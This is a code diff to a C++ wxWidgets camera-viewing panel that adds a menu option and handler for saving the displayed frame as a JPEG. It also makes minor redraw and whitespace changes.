@@ -15,6 +15,7 @@ wxBEGIN_EVENT_TABLE(panelPictureBox, wxPanel)
 	EVT_MENU(EnumCamMenu::ID_SingleShot, panelPictureBox::OnSingleShot)
 	EVT_MENU(EnumCamMenu::ID_Iniciar_Live, panelPictureBox::OnLive)
 	EVT_MENU(EnumCamMenu::ID_Detener_Live, panelPictureBox::OnStopLive)
+	EVT_MENU(EnumCamMenu::ID_Guardar_Frame, panelPictureBox::OnGuardarFrame)
 wxEND_EVENT_TABLE()
 
 panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex, wxString strName) :
@@ -30,6 +31,8 @@ panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamI
 	camMenu->AppendSeparator();
 	camMenu->Append(EnumCamMenu::ID_Iniciar_Live, "Iniciar Live");
 	camMenu->Append(EnumCamMenu::ID_Detener_Live, "Detener Live");
+	camMenu->AppendSeparator();
+	camMenu->Append(EnumCamMenu::ID_Guardar_Frame, "Guardar Captura");
 
 	camMenu->Enable(EnumCamMenu::ID_Detener_Live, false);
 
@@ -57,7 +60,7 @@ void panelPictureBox::OnDrawBuffer() {
 				this->imageCtrl->SetBitmap(bmp_Obj);
 				this->GetSizer()->Layout();
 				this->GetSizer()->Fit(this);
-				this->Refresh();
+				this->Refresh(false);
 				this->Update();
 			} else {
 				error();
@@ -67,12 +70,9 @@ void panelPictureBox::OnDrawBuffer() {
 	}
 }
 
-
-
 void panelPictureBox::OnClose(wxCloseEvent& event) {
 	Destroy();
 }
-
 
 void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
 	//Enviar comando para obtener captura sencilla
@@ -112,6 +112,15 @@ void panelPictureBox::OnLive(wxCommandEvent& event) {
 	strComando += vcTmp[vcTmp.size() - 1];
 
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void panelPictureBox::OnGuardarFrame(wxCommandEvent& event) {
+	wxFileDialog dialog(this, "Guardar frame", wxEmptyString, "captura.jpg", wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);
+	if (dialog.ShowModal() == wxID_OK) {
+		if (!this->imageCtrl->GetBitmap().SaveFile(dialog.GetPath(), wxBITMAP_TYPE_JPEG)) {
+			wxMessageBox("No se pudo guardar " + dialog.GetPath(), "Error", wxID_OK);
+		}
+	}
 }
 
 panelCamara::panelCamara(wxWindow* pParent):
